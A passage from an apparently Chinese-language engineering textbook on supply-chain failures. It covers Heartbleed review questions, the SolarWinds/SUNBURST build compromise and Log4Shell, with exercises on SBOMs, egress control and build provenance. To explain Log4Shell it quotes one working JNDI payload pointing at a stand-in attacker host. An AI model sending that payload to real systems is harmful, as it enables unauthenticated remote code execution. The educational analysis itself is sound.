個套件，`npm ls` 攤平後間接相依逾 800 個。挑三個關鍵的：(1) 我的 TLS 終止其實在 ALB，由 AWS 維護、資源充足，這個相對安心；(2) 我用某個小眾的序列化／驗證庫處理外部 webhook payload，去 GitHub 一看——**一個維護者、上次發版 14 個月前、零贊助**，這就是我的 Heartbleed 形狀單點：它直接吃外部輸入、又沒人在顧；(3) 我的 logging 庫雖然主流，但提醒我 Log4Shell（見 ch20）就是這類東西出的事。降風險動作：對 (2)，短期——把它包在我自己的輸入驗證層後面（先 sanity check 才交給它解析）、釘住版本並開 Dependabot 告警；中期——評估換成有金主／更活躍的替代品，或自己 fork 並補上我需要的檢查；長期——把『關鍵相依的維護健康度』納入定期 review，而不是等出事才查。」\n\n注意這個回答的關鍵動作是「**先在我自己這層補上輸入驗證，不把信任全押在那個沒人顧的相依上**」——這正是 Heartbleed 與 ch20 的共同教訓：你的信任邊界要畫在「你能控制的那一層」，而不是「你 import 進來的那一層」。\n\n## 自我檢核\n\n口頭自答，講得出來才算過關：\n\n1. heartbeat 的設計本意是無害的（確認連線還活著）。那麼危險的到底是 heartbeat 這個概念，還是某個具體的實作決定？請精確說出是哪一個決定。\n2. 為什麼說 Heartbleed 是 buffer over-**read** 而不是 over-write？這個區別為什麼讓它「靜默成功、不留痕跡」、進而讓善後變成「假設一切已洩漏」？\n3. 為什麼這個缺陷能潛伏逾兩年？把這個答案講成「沒人夠聰明」或「就是運氣不好」為什麼是錯的？Linus 定律（足夠多的眼睛）的前提，在這個案子裡哪裡沒被滿足？\n4. 為什麼把根因定在「Seggelmann 寫錯了一行、review 沒抓到」是個會讓你錯失教訓的 root-cause 迷思？真正的「孔洞0」是什麼？\n5. 1.0.1g 的修補只有一行（宣告長度對不上實際就忽略心跳）。既然修補這麼簡單，為什麼這仍是一場全球級災難而不是一個小 patch？（提示：F14、潛伏期、不留痕跡）\n6. CII 修的不是那行 code，是什麼？為什麼說「給錢給人」補的是「能潛伏多久」這一層，而不是「會不會被寫出來」那一層？\n7. 在你自己的系統裡，「相信上游宣告的長度／數量，卻沒比對實際內容」最可能出現在哪一處解析邏輯上？那裡缺的那一行檢查是什麼？\n8. 你的關鍵相依裡，哪一個最像「全世界都用、其實沒人在顧」的單點？你的 SBOM 答得出「我中不中招」嗎？如果答不出，下一個 Heartbleed 來的那天你會怎麼樣？\n\n## 延伸閱讀\n\n- **heartbleed.com（Codenomicon）**：當年為這個 bug 取名、做 logo 的那個網站，至今仍是最清楚的一手科普——用非技術語言講清楚洩了什麼、為什麼嚴重、該做什麼。本章「為什麼要輪換金鑰」的權威來源。https://heartbleed.com/\n- **NVD — CVE-2014-0160**：官方漏洞條目，列出受影響版本（OpenSSL 1.0.1–1.0.1f）、CVSS 評分與技術摘要。查證版本範圍與時間線的基準。https://nvd.nist.gov/vuln/detail/CVE-2014-0160\n- **OpenSSL 安全公告（2014-04-07）**：OpenSSL 專案自己的揭露公告，點明修補版本 1.0.1g 與緩解建議。一手來源。https://www.openssl.org/news/secadv/20140407.txt\n- **CNN Business「Your Internet security relies on a few volunteers」（2014-04-18）**：把「約四人、一名全職、年捐約兩千美元」這個組織面教訓講給大眾聽的代表性報導，是理解本章「孔洞0」與公地悲劇的好入口。https://money.cnn.com/2014/04/18/technology/security/heartbleed-volunteers/index.html\n- **CloudFlare Heartbleed Challenge writeup（Errata Security）**：研究員如何在十小時內靠 Heartbleed 抽出私鑰的實證紀錄，把「最壞情況是否可行」從理論變成已證實。https://blog.erratasec.com/2014/04/cloudflare-challenge-writeup.html\n- **Core Infrastructure Initiative（維基百科條目）**：CII 的成立、出資成員與資助專案清單，本章「制度遺產」段的查證來源。https://en.wikipedia.org/wiki/Core_Infrastructure_Initiative\n"}, {"id": "ch20-supply-chain", "file": "ch20-supply-chain.md", "group": "Part VI — 看不見的縫：安全、供應鏈與靜默損毀", "title": "ch20 — 供應鏈即災難：當你信任的更新本身被下毒", "md": "# ch20 — 供應鏈即災難：當你信任的更新本身被下毒\n\n> **本章解剖什麼**：前兩章（見 ch18、ch19）看的是「你自己的程式有個沒設防的小洞」——Morris 的 fingerd 溢位、Heartbleed 的缺漏邊界檢查。這一章把鏡頭拉到一個更難防的地方：洞不在你的程式裡，在你**信任**的東西裡。SolarWinds（2020）是一個經過官方簽章、來自官方更新通道的合法更新，本身被植入了後門——你的所有驗證機制全部放行，因為它們驗的是「來源」不是「內容」。Log4Shell（2021）是一個無所不在、你以為無害的 log 函式庫，藏著一條「把被記錄的字串當程式碼執行」的路徑——它深埋在你依賴的依賴的依賴裡，你甚至不知道自己用了它。兩案的共通形狀：**你的安全邊界，延伸到每一個你 import 的套件、每一個 CI 拉的 base image、每一個會自動更新的 agent。** 主打 **F12**（變更即觸發：自動更新管道本身成為投毒管道）、**F3**（起司孔洞對齊：信任鏈每一層都沒檢出）、**F14**（規模放大／單一栽培：無所不在＝爆炸半徑巨大）、**F8**（潛伏條件：後門潛伏數月、漏洞潛伏多年）。這是 Part VI「看不見的縫」的收束——縫不在你看得到的地方，在你根本沒在看的地方。\n\n## 從你已知的出發\n\n先做一件你大概從來沒認真做過的事：把你「一次部署」的信任鏈，從頭到尾畫出來。\n\n不是畫 CI/CD pipeline 的流程圖——那個你閉著眼睛都會畫。我要你畫的是**信任**的傳遞：從你按下 merge 的那一刻，到那行程式碼在 prod 跑起來，中間有多少個環節，是你「相信它沒問題、但從沒真的驗證過」的。\n\n試著數。你 commit 的程式碼，import 了一堆 npm 套件——你讀過其中幾個的原始碼？你的 `package-lock.json` 鎖住了版本，但鎖住的那個版本，是你信任 npm registry 沒被掉包、信任那個套件的作者沒在某次小版本更新裡塞東西。你的 CI 跑在一個 base image 上——`node:20-alpine` 之類——那個 image 裡有幾百個你沒列、也沒看過的系統套件，是 Docker Hub 上某個帳號推上來的。你的 CI 本身跑在 GitHub Actions 上，每一步 `uses:` 的 action 是別人的 repo，很多人直接 pin 一個 tag（`@v3`）而不是 commit SHA——而 tag 是可以被重新指向的。你的 ECS task 上跑著監控 agent、APM agent、安全掃描 agent，它們全都**會自動更新自己**，而且通常跑在比你的應用更高的權限上。\n\n數完了嗎？大部分人數到一半就會發現：**這條鏈上，你真正「驗證過內容」的環節，趨近於零。** 你驗證過的是**來源**——套件來自 npm 官方、image 來自官方 registry、更新有正確簽章。你那句「應該沒事吧」的完整版是：**「一個來源可信、經過簽章的官方更新，內容應該是安全的吧。」**\n\n這一章要拆穿的，就是這句話。SolarWinds 告訴你：一個合法簽章、來自官方通道的更新，本身可以是有毒的——簽章只證明「它真的來自 SolarWinds」，不證明「SolarWinds 給你的東西沒被人動過手腳」。Log4Shell 告訴你：你以為最無害的一個動作——把使用者送來的字串寫進 log——可以是一個未經身分驗證的遠端程式碼執行入口；而那條漏洞所在的函式庫，深埋在你依賴鏈的某一層，你連自己用了它都不知道。\n\n焦慮工程師的本能是「不信任任何輸入」。這一章把那個本能往外推一圈：**你的「輸入」不只是使用者打進來的字串，還包括你 import 的每一行別人的程式碼、你拉的每一個 image、你的 agent 半夜自動裝上的每一個更新。** 你的信任邊界，比你以為的大得多——而它最薄的地方，往往是你最不會去看的地方。\n\n## SolarWinds／SUNBURST：簽章是真的，內容是毒的\n\n### 冷開場：FireEye 發現自己被偷了\n\n2020 年 12 月初。一家叫 FireEye 的資安公司——專門幫別人抓駭客、做事件應變的頂尖公司——發現了一件很糟的事：**自己被入侵了**。攻擊者偷走了它的紅隊工具（red team tools，模擬攻擊用的一整套武器）。\n\n對一家資安公司來說，這是丟臉，但還不是世界末日。真正讓人脊背發涼的，是接下來的追查。FireEye 的調查團隊往回挖，想知道攻擊者是怎麼進來的——結果發現入口不在自己這邊的任何一個漏洞，而在一個它信任、而且全世界數萬家機構都信任的東西：一套叫 **SolarWinds Orion** 的網路管理軟體，以及它一次**完全正常、經過官方簽章的例行更新**。\n\n2020 年 12 月 13 日，FireEye 公開揭露。同一天，美國網路安全暨基礎設施安全局（CISA）發出緊急指令 ED 21-01，要求所有聯邦機構立刻把裝有受影響 Orion 版本的伺服器**斷網下線**。\n\n這不是一家公司被打。這是美國財政部、商務部、國土安全部，以及一大批大型企業，全都在過去九個多月裡，透過一個它們花錢買來、用來「監控自己網路健康」的工具，被同一個攻擊者開了後門。後來歸因為與俄羅斯對外情報局（SVR）有關的 APT29（也叫 Cozy Bear 或 NOBELIUM）。\n\n### 裝填：後門不在程式裡，在「做出程式的那台機器」裡\n\n要看懂這場災難為什麼這麼難防，得先把一個直覺打掉。\n\n你聽到「SolarWinds 被駭」，第一反應大概是：Orion 這套軟體有個漏洞，攻擊者利用它進去。**這是錯的，而且這個錯誤本身就是本案的核心教訓。** Orion 的原始碼沒有可被利用的漏洞。攻擊者沒有去攻擊 Orion 這個「產品」——他們去攻擊了**製造 Orion 的那條生產線**。\n\n具體說：攻擊者先潛入了 SolarWinds 的內部**建置環境**（build environment）——就是把原始碼編譯成出貨二進位檔的那套 CI 系統。然後他們在裡面植入了一個專用的惡意工具，事後被命名為 **SUNSPOT**。SUNSPOT 不做別的，它只做一件事：**監看 Orion 的 build**。\n\n當建置流程開始編譯某一個特定的原始碼檔時，SUNSPOT 會在「編譯正要發生的那一瞬間」介入——把後門程式碼（事後命名為 **SUNBURST**，一個惡意的 `.dll`）即時注入到那個正在被編譯的檔案裡，等編譯一結束，馬上把原始碼還原回乾淨的原樣。\n\n停下來體會這個設計的惡毒。SolarWinds 工程師去看原始碼，是乾淨的；版本控制的歷史，是乾淨的；編譯出來的 `.dll` 卻帶著後門。後門只活在「編譯的那一刻」，存在於原始碼與二進位檔之間那道沒人會去盯的縫裡——你**信任 build 系統會忠實地把原始碼變成二進位檔**，而這個信任，正是被攻破的地方。\n\n接下來才是最關鍵的一步：這個帶後門的 `.dll`，跟著**完全正常的出貨流程**走下去。它被 SolarWinds **合法的程式碼簽章**（code signing）簽署——因為對 SolarWinds 的簽章系統來說，這就是 build 系統正常產出的二進位檔，沒有理由不簽。然後它經由 **SolarWinds 官方的更新通道**，推送給所有訂閱 Orion 更新的客戶。\n\n對下游的每一個客戶而言，它是一個**毫無破綻的更新**：來自官方通道、帶著官方有效簽章、版本號正常、安裝過程正常。你公司的安全政策說「只安裝官方簽章的更新」——它通過了。你的端點偵測軟體驗證簽章——它通過了。每一道你為「確保更新可信」而設的關卡，這個後門都**合法地**走了過去，因為那些關卡驗的全是「來源」。\n\n惡意更新在 2020 年 3 月到 6 月之間隨 Orion 更新散布。\n\n### 觸發與潛伏：兩週的沉默，然後選擇性出手\n\nSUNBURST 被裝到下游機器上之後，並沒有立刻動作。它先**潛伏約兩週**（這是 F8 潛伏條件最教科書的展現：災難早已裝填，觸發被刻意延後）。這個延遲是攻擊者的設計——它讓後門的「裝上」與「啟動」在時間上拉開，使得任何想「裝上後立刻觀察行為」的沙箱分析都看不到東西。\n\n潛伏期過後，SUNBURST 啟動。它做的第一件事不是搞破壞，而是**偵察與偽裝**：檢查自己跑在什麼環境裡，如果發現像是分析沙箱或資安研究人員的機器，就保持沉默不動作。確認是真實目標後，它才開始以**擬態正常流量**的方式，與攻擊者的命令控制（C2）伺服器通訊——它的網路行為被設計得像 Orion 本來就會發的那種遙測流量，混在正常噪音裡。\n\n然後是最冷靜的一步：在約 18,000 個下載了帶後門更新的組織裡，攻擊者**不是對所有人都動手**。他們把這 18,000 當成一個篩選池，只對其中**極少數高價值目標**（分析指實際被進一步深入入侵的少於約 100 個組織，照 landscape）投放後續工具（如 TEARDROP、Cobalt Strike），展開真正的滲透與情報竊取。\n\n這一點常被講錯。流行說法是「18,000 家公司被駭」——不精確。18,000 是**下載了後門更新**的數量上限；真正被深入利用的，是其中精挑細選的不到約 100 個。這不是無差別的破壞，是一場有耐心、有選擇、重在隱匿與情報的諜報行動。它不勒索、不破壞、不喧嘩——它要的是**待在裡面、不被發現、慢慢拿東西**。它能潛伏九個多月，正因為它從不做會觸發警報的吵鬧行為。\n\n### 餘波：最後是誰抓到的？\n\n整場行動最後是怎麼曝光的，本身就是對「自動偵測」的一記耳光。\n\n不是哪家機構的入侵偵測系統叫了，也不是哪個自動掃描抓到惡意簽章——因為簽章是合法的。是 **FireEye 因為自己的紅隊工具被偷、往回追查，才意外揪出整條供應鏈**。這場橫跨數萬機構、潛伏九個多月的入侵，最終是靠攻擊者「順手多偷了一點東西」、踩到一家有能力反查的資安公司，才被掀開。要不是攻擊者貪了這一手，它可能還會潛伏更久。\n\n事後美國政府正式把它歸因於俄羅斯 SVR。CISA 的緊急指令、Mandiant/FireEye 與 Microsoft 的技術分析，把 SUNSPOT（編譯期注入工具）、SUNBURST（後門）、TEARDROP（後續載荷）一一拆解。整起事件被視為「軟體供應鏈的建置流程，是一個全新的、極高價值的攻擊面」這一認知的分水嶺。它的核心結論可以濃縮成一句，後面 ch22、ch23 都會回收：**可信的「來源」，不等於可信的「內容」。**\n\n## Log4Shell：一個 log 函式，一條遠端執行漏洞\n\n### 冷開場：一條聊天訊息打穿一台伺服器\n\n2021 年 12 月。一群 Minecraft 玩家發現，只要在遊戲的**聊天框**裡貼上一段特定格式的文字，就能讓**伺服器**去執行任意程式碼。\n\n讓我們把這件事的荒謬程度講清楚。不是上傳惡意檔案，不是利用某個登入漏洞，不是 SQL injection——就只是**在聊天框打一句話**。那句話會被伺服器記進 log，而光是「被記進 log」這個動作，就足以讓攻擊者控制的程式碼在伺服器上跑起來。\n\n同一個技巧很快被發現適用範圍遠遠不只 Minecraft。問題出在一個叫 **Apache Log4j 2** 的 Java logging 函式庫——一個極其普遍、被無數企業系統、雲服務、甚至各種你想不到的裝置當作「寫 log」這件再基本不過的事的底層元件。漏洞編號 **CVE-2021-44228**，外號 **Log4Shell**，CVSS 嚴重度評為滿分 **10.0**。\n\n2021 年 12 月 9 日公開揭露（漏洞報告其實在 11 月 24 日就提交給了 Apache）。接下來的幾天，全世界的資安團隊與工程師過了一個不眠的週末——因為這個漏洞的爆炸半徑，幾乎等於「全世界的 Java 伺服器」。\n\n### 裝填：「記錄資料」這個動作，被設計成可以「執行程式碼」\n\nLog4Shell 的可怕，不在於它是個複雜的漏洞——恰恰相反，它的機制簡單到讓人發冷。它是好幾個「各自看起來合理」的設計決定，疊在一起的結果。\n\n**潛伏條件一：Log4j 會對 log 訊息的內容做「插值」。**\n\nLog4j 2 支援一種叫 lookup 的語法：在 log 訊息裡寫 `${...}`，Log4j 在記錄時會把它**展開**成某個動態值。例如 `${java:version}` 會被換成 Java 版本號。立意是方便——讓你在 log 裡嵌入環境資訊。問題是：它對「被記錄的訊息內容本身」也做這種展開。也就是說，如果你的程式碼是 `log.info(userInput)`，而 `userInput` 裡含有 `${...}`，Log4j 會**主動去解析並執行**那個 `${...}`。\n\n請體會這道縫。在你的心智模型裡，「寫 log」是一個**唯讀的、被動的、無害的**動作——你只是把一串字記下來。但在 Log4j 的實作裡，log 訊息**不是純資料，它會被當成一種小型的可執行模板**。資料與程式碼之間那條你以為存在的界線，在這裡崩掉了。\n\n**潛伏條件二：lookup 裡包含 JNDI，而 JNDI 可以從遠端載入並執行 class。**\n\nLog4j 支援的 lookup 之一是 JNDI（Java Naming and Directory Interface）lookup：`${jndi:...}`。JNDI 是 Java 用來查目錄服務（LDAP、RMI、DNS 等）的標準介面。而 JNDI 有一個極其強大、也極其危險的能力：它可以**從遠端伺服器抓回一個 Java class，然後把它載入到當前的 JVM 裡執行**。\n\n把這兩個條件串起來，致命的攻擊就成形了。攻擊者只要讓一個含有\n\n```\n${jndi:ldap://attacker.com/a}\n```\n\n的字串，被你的應用程式寫進 log——Log4j 在記錄時就會：(1) 看到 `${jndi:...}`，啟動 JNDI lookup；(2) 向 `attacker.com` 控制的 LDAP 伺服器發出查詢；(3) 抓回攻擊者準備好的惡意 Java class；(4) **載入並執行它**。這就是一個未經任何身分驗證、不需任何權限的**遠端程式碼執行（RCE）**。\n\n**潛伏條件三：「把使用者輸入寫進 log」是全世界的普遍習慣。**\n\n最後一塊拼圖，是這個攻擊的觸發點有多麼唾手可得。把使用者可控的字串寫進 log，是業界**到處都在做**的事——記下每個請求的 `User-Agent` header、記下登入失敗時使用者填的帳號、記下表單欄位、記下聊天訊息。這些全都是「為了排查問題而留紀錄」的正常工程實務。而恰恰是這個無所不在的好習慣，讓攻擊者有無數個入口可以把惡意字串送進你的 log——改一個 HTTP header 就行，不需要登入、不需要任何權限。\n\n### 觸發與爆炸：無所不在，就是無處可逃\n\n攻擊本身簡單到可以寫成一行：把 `${jndi:ldap://...}` 塞進任何一個會被目標伺服器記錄的欄位。揭露後的幾天內，全球的伺服器 log 裡開始出現海量的這種探測字串——攻擊者用自動化工具地毯式地對著整個網際網路掃，試圖找出哪些伺服器會「上鉤」去連他們的 LDAP。\n\n但真正讓 Log4Shell 成為「近年最嚴重漏洞」的，不是這個攻擊多巧妙，而是它的**規模**——這正是 F14（規模放大／單一栽培）。Log4j 太普遍了，普遍到它構成了 Java 生態的一種單一栽培（monoculture）：太多東西都用同一個元件來做「寫 log」這件最基本的事。一個漏洞，瞬間讓全球**數以百萬計**的伺服器與應用同時暴露。\n\n更糟的是它**藏得有多深**。很少有人是「直接」用 Log4j 的——它通常是「**依賴的依賴的依賴**」，深埋在某個你引入的框架、某個你用的函式庫、某個你拉的 base image 裡面。揭露當下，全世界無數組織面對的第一個問題甚至不是「怎麼修」，而是「**我到底有沒有用 Log4j？用在哪？**」——很多人根本答不出來，因為他們從沒列過自己完整的依賴清單。\n\n這就是 F14 與 F8 的合謀：無所不在（爆炸半徑巨大）＋藏在遞移依賴深處（潛伏、難以盤點）。「升級 Log4j 就好了」這句話，難就難在前半句——你得先**找到所有用到它的地方**，而這對一個沒有軟體物料清單（SBOM）的組織來說，幾乎是不可能完整的任務。\n\n### 餘波：endemic，會跟我們很多年\n\nLog4Shell 沒有官方事故調查（它是個漏洞，不是單一事故），但美國的網路安全審查委員會（Cyber Safety Review Board, CSRB）在 2022 年 7 月發布了一份專題報告，下了一個讓人不太舒服的結論：Log4Shell 是一個 **endemic（地方性長存）** 的漏洞——它不會「修完就結束」，而是會在未來**很多年**持續被利用，因為總有些深埋在某處、沒人盤點到的 Log4j 一直沒被升級。\n\nCSRB 同時把矛頭指向更深的問題：開源依賴的治理缺口，以及 SBOM（軟體物料清單）的普遍缺失。這份報告的潛台詞，正好接回本章開頭要你做的那件事：**如果你連自己用了什麼都列不出來，你就無法在下一個 Log4Shell 來的時候，知道自己該修哪裡。**\n\n## 故障解剖\n\n兩場災難，表面上很不一樣：一個是國家級駭客精心植入的後門，一個是開源函式庫裡一個危險的預設行為。但把它們放進失敗模式語言，會看到同一個骨架。\n\n### 潛伏 vs 觸發\n\n| | 潛伏條件（早就裝填好的） | 觸發（最後一根稻草） |\n|---|---|---|\n| **SolarWinds** | build 系統被植入 SUNSPOT、信任根（簽章＋官方通道）被默認為等於「內容可信」、自動更新通道可瞬間擴散 | 一次例行 Orion 更新——對下游而言完全正常、合法簽章、來源可信 |\n| **Log4Shell** | log 訊息會被插值、JNDI 能遠端載入執行 class、「記錄使用者輸入」是普遍習慣、Log4j 深埋在遞移依賴 | 一個含 `${jndi:ldap://...}` 的字串，被寫進了 log |\n\n兩案的潛伏條件都不是「bug」——它們是**設計決定與信任假設**。SolarWinds 的潛伏條件是「我們相信官方簽章的更新」這個合理到沒人質疑的政策；Log4Shell 的潛伏條件是「lookup 很方便」「JNDI 很強大」「記 log 很無害」這三個各自合理的決定。觸發都極其平凡：一次例行更新、一句被記下的字串。**災難不在觸發的戲劇性，在潛伏條件早已悄悄把炸藥裝滿。**\n\n### 起司的孔洞\n\n這兩案最值得看的，是它們各自打穿了你「信任鏈」上的哪幾層防禦。先看 SolarWinds：\n\n```\n你的程式 ─┬─[防線1: 只裝官方來源的更新]─── 破洞: 後門就來自官方通道\n          │\n          ├─[防線2: 驗證程式碼簽章]──────── 破洞: 簽章合法，驗的是來源不是內容\n          │\n          ├─[防線3: 端點偵測已知惡意]────── 破洞: 後門擬態、潛伏、避沙箱，非已知特徵\n          │\n          └─[防線4: 異常流量告警]────────── 破洞: C2 擬態正常遙測，混在噪音裡\n                                            ↓\n                                  靠 FireEye 自己被偷，才被反查出來\n```\n\n每一層都是為「確保更新可信」而設的合理防線，每一層都被**合法地**穿透——因為它們驗的全是「來源／已知特徵」，而攻擊把毒裝進了「來源可信、特徵未知」的內容裡。\n\n再看 Log4Shell：\n\n| 防線 | 為什麼沒擋住 |\n|---|---|\n| 輸入驗證（不信任使用者輸入） | 你驗的是「這個字串會不會破壞我的邏輯」，沒料到「光是把它寫進 log」就會觸發執行——資料/程式碼界線崩潰 |\n| 「記 log 是唯讀無害動作」的假設 | 這個假設在 Log4j 的插值＋JNDI 設計下根本不成立 |\n| 知道自己用了哪些元件（盤點） | Log4j 是遞移依賴，深埋多層，多數組織沒有 SBOM、無從盤點 |\n| 最小權限／網路出口管制 | 多數伺服器能自由對外發 LDAP/RMI 連線，給了 JNDI 抓回惡意 class 的通道 |\n\n兩張表都在反駁同一個「單一根因」的衝動。SolarWinds 不是「簽章機制壞了」——簽章運作完全正常，問題是**我們對簽章的期待錯了**（以為它保證內容）。Log4Shell 不是「log4j 有個 bug」——它是好幾個合理設計疊加的湧現性危險，加上一個沒人盤點得清的依賴生態。能問的問題不是「誰寫了壞程式」，是「**為什麼我的整條信任鏈，沒有任何一層在驗『內容是否真的安全』**」。\n\n### 對應模式\n\n- **F12（變更即觸發）**：兩案都是「動了它就是觸發」，而且觸發點是你**最信任、最不設防**的那個動作。SolarWinds 是「安裝一次官方更新」——你天天做、從不懷疑；自動更新管道本身成了投毒管道。Log4Shell 是「把一個字串寫進 log」——比部署還日常。F12 在這裡尤其陰險：觸發不是一次危險操作，是一次你定義為「絕對安全」的例行動作。\n- **F3（起司孔洞對齊）**：SolarWinds 是 F3 的極端展現——信任鏈上**每一層驗證都運作正常**，卻**每一層都沒擋住**，因為它們對齊在同一個盲點（驗來源、不驗內容）。這不是某一層破了洞，是所有層的洞剛好都在同一個位置。\n- **F14（規模放大／單一栽培）**：Log4Shell 是 F14 的純粹形態——Log4j 的無所不在構成單一栽培，一個漏洞一次打中所有人；SolarWinds 則是**自動更新通道**這個 F14——同一個受信任的散布管道，把單一建置入侵瞬間擴散到 18,000 個組織。\n- **F8（潛伏條件 vs 觸發）**：SUNBURST 刻意潛伏約兩週才啟動、潛伏九個多月才被發現；Log4Shell 這個危險設計潛伏在 Log4j 裡更久（受影響版本從 2.0-beta9 起），無人察覺其武器化潛力。災難早就裝填好，只等一個再平凡不過的觸發。\n\n### 一句話形狀\n\n**SolarWinds 的形狀是**：一個合法簽章、來自官方通道的更新，在「做出它的那台 build 機器」上被植入了後門——你信任鏈上每一道驗證都正常運作、也都合法放行，因為它們驗的是「來源」而非「內容」，於是毒透過你最不設防的自動更新管道，一次擴散到數萬機構。\n\n**Log4Shell 的形狀是**：一個你以為無害的「寫 log」動作，因為 Log4j 把 log 訊息當可執行模板、又內建能遠端載入執行 class 的 JNDI——使任何一句被記錄的使用者輸入，都成了未經驗證的遠端程式碼執行入口；而 Log4j 的無所不在與深埋遞移依賴，讓這個漏洞的爆炸半徑大到「全球 Java 伺服器」、又難盤點到「沒人說得清自己有沒有中」。\n\n合起來，兩案是同一句話：**你的安全邊界，延伸到每一個你 import 的東西、每一個你信任的自動更新管道——而你對它們，幾乎只驗過來源，從沒驗過內容。**\n\n## 換成你的系統\n\n你活在這條信任鏈的正中央，而且比 SolarWinds 的客戶更深——他們至少知道自己裝了 Orion，你的 `node_modules` 裡有幾百個你根本沒讀過的套件。\n\n**先點名你那句「應該沒事吧」**：一個來源可信、有官方簽章／來自官方 registry 的依賴或更新，內容是安全的。\n\n這個假設錯的時候，會以兩種形狀壞給你看。\n\n**形狀一（SolarWinds 型）：合法管道散布的毒。** 你 `npm install` 的某個套件——一個你信任多年、星星數很高的工具——維護者帳號被釣魚盜了，或維護權被轉交給惡意第三方，然後在一次**看起來再正常不過的小版本更新**裡（`1.4.2` → `1.4.3`），塞進一段在 install script 或執行期偷偷外傳環境變數（你的 AWS 金鑰、token）的程式碼。`package-lock.json` 不會救你——如果你跑的是 `npm install` 而非嚴格的 `npm ci`，或 Renovate/Dependabot 自動把 patch 版本合進來，這個更新會**順著你信任的自動化流程**進到 build，被你的 CI 簽章、打包、部署。pipeline 每一步都「成功」，因為它驗的是「套件來自 npm、版本對得上」——從不驗「這個版本的內容有沒有變壞」。這就是 SolarWinds 的形狀，只是把「Orion 更新」換成「你某個 transitive dependency 的 patch bump」。供應鏈攻擊在 npm 生態（typosquatting、帳號劫持、惡意 maintainer）是**真實且反覆發生**的，不是假設。\n\n**形狀二（Log4Shell 型）：你以為無害的動作，藏著執行路徑。** 你的某個依賴——你甚至不知道你用了它，它是依賴的依賴——在處理某種你天天餵給它的輸入時，有一條你完全沒想到的程式碼執行路徑：某個序列化函式庫的不安全反序列化、某個模板引擎的伺服器端模板注入。你以為你在「解析資料」，那個函式庫在特定輸入下卻會「執行程式碼」。資料/程式碼界線崩潰——和 Log4Shell 一模一樣的形狀。\n\n可操作的自問，不要只記「要小心」：\n\n1. **我的依賴是用什麼安裝的？** CI 裡是嚴格的 `npm ci`（完全照 lockfile，不自作主張升版）還是 `npm install`？我的自動升版工具（Dependabot/Renovate）會不會把 patch/minor 自動 merge 進來、繞過人眼？——這道直接對應「SolarWinds 型」的入口。\n2. **我有沒有 SBOM？我能不能在 30 分鐘內回答「我有沒有用 X 套件、用在哪幾個服務」？** Log4Shell 那個週末，能在 30 分鐘內答出來的團隊，和答不出來的團隊過的是兩種人生。`npm ls <pkg>` 跑得出來嗎？你的 image 裡有 SBOM 嗎？\n3. **我的 build／runtime 跑在什麼權限上？出口（egress）管不管？** 如果一個被投毒的 install script 想把我的 secrets 外傳，或一個被利用的依賴想對外連 LDAP 抓 class——我的 CI runner、我的 ECS task 能不能自由對任意外部位址發連線？最小權限與 egress 管制，是把「萬一中了」的爆炸半徑壓下來的那道牆（接 ch22 的「安全地壞」）。\n4. **我的監控／安全 agent，是不是會自動更新、又跑在高權限？** 這正是 SolarWinds 與 CrowdStrike（見 ch13）的共通教訓——你裝來「保護自己」的東西，本身就是一個會自動更新、權限極高的單點。它的更新，你 canary 了嗎？\n\n最後一個橋接，回到 ch19（見 ch19）：Heartbleed 是「你依賴的開源元件，沒人有資源去顧」；這一章是「你依賴的開源元件，被人**刻意**動了手腳，或藏著被武器化的能力」。前者是疏於照料的脆弱，後者是被惡意利用的脆弱——但兩者指向同一個動作：**先知道你到底依賴了什麼。** 你連清單都沒有，談什麼防禦。\n\n## 紙上推演\n\n### 推演題1 **[20 分鐘]** ★★\n\n把你**最近一次**真實部署的信任鏈畫出來——從你按下 merge，到那行程式碼在 prod 跑起來。每一個環節標兩件事：(a) 它是「你寫的／你控制的」，還是「你信任別人的」；(b) 對於「你信任別人的」那些，你驗證的是**來源**還是**內容**。數一數：這條鏈上,你真正驗證過「內容」的環節有幾個？\n\n#### 推演解答\n\n（開放題，自答。）一條典型的鏈大概長這樣：你的 commit（你寫的）→ import 的 npm 套件（信任別人；驗來源——lockfile 鎖了版本與 hash，但 hash 只證明「和上次裝的是同一份」，不證明「這份內容安全」）→ CI 的 base image（信任別人；通常連來源都只驗到 tag）→ GitHub Actions 的第三方 action（信任別人；很多人 pin `@v3` 這種可變 tag，連來源都不嚴）→ build 出的 artifact（你的 build 系統產出——這正是 SolarWinds 被攻破的環節，你信任 build 忠實編譯）→ 部署→ runtime 上的各種 agent（信任別人，且會自動更新）。\n\n數下來，「驗證過內容」的環節幾乎是零——你驗的全是來源（簽章、registry、hash）。這題的目的不是讓你立刻去 audit 每一個套件（不現實），是讓你**親眼看到**自己對「來源 = 內容安全」這個等號的依賴有多深。SolarWinds 與 Log4Shell 都是在攻擊這個等號。能把這條鏈畫出來、並指出「這裡、這裡、這裡，我只驗了來源」，這題就過了。\n\n### 推演題2 **[15 分鐘]** ★★\n\n口頭（或寫給另一個工程師）解釋：為什麼「這個更新有合法的官方簽章」**不等於**「這個更新是安全的」？SolarWinds 的簽章到底證明了什麼、沒證明什麼？如果簽章不夠，要再加一道什麼，才能在「內容被植入後門」時抓到？\n\n#### 推演解答\n\n程式碼簽章證明的是**完整性與來源**：這個二進位檔確實來自持有該私鑰的一方（SolarWinds），且從簽署之後沒被改過。它**沒有**證明的是：在簽署的那一刻，被簽的內容本身是否乾淨。SolarWinds 案裡，後門在**簽署之前**就被注入了（SUNSPOT 在編譯期注入，產物正常地走到簽章那一步）——所以簽章忠實地簽了一份已經有毒的東西。簽章只能保證「從 A 點到 B 點沒被竄改」，保證不了「A 點本身沒被污染」。\n\n要在「A 點被污染」時抓到，需要把信任往源頭推、並驗「內容對得上原始碼」：可重現建置（reproducible builds，讓任何人從同一份原始碼能編出位元相同的二進位檔，從而比對出 build 系統有沒有偷改）、build 來源證明（provenance / SLSA 之類，記錄「這個 artifact 是由哪份 commit、在哪個受信環境、怎麼建出來的」）、以及 build 環境本身的完整性監控。核心觀念是把問題從「這東西是不是來自官方」升級成「**這東西的內容，能不能對應到我能審查的原始碼**」。能講清楚「簽章驗的是傳輸完整性與來源、不是內容善惡」，這題就過了。\n\n### 推演題3 **[20 分鐘]** ★★★（對帳）\n\n把你維運過、或你聽過的一次真實供應鏈／依賴事故（npm 套件被投毒、某個 base image 帶漏洞、某次自動升版引入了壞東西、或你們在 Log4Shell 那個週末做了什麼），對應到本章的 F 模式。逐項問：觸發是不是一次「你信任的更新／依賴」的變更（F12）？有沒有同質化＋規模放大（F14：大家都用同一個東西）？信任鏈上有幾層驗證，它們是不是全在驗來源、對齊在同一個盲點（F3）？這個危險是不是早就潛伏、只等觸發（F8）？\n\n#### 推演解答\n\n（開放題，自答。）以 Log4Shell 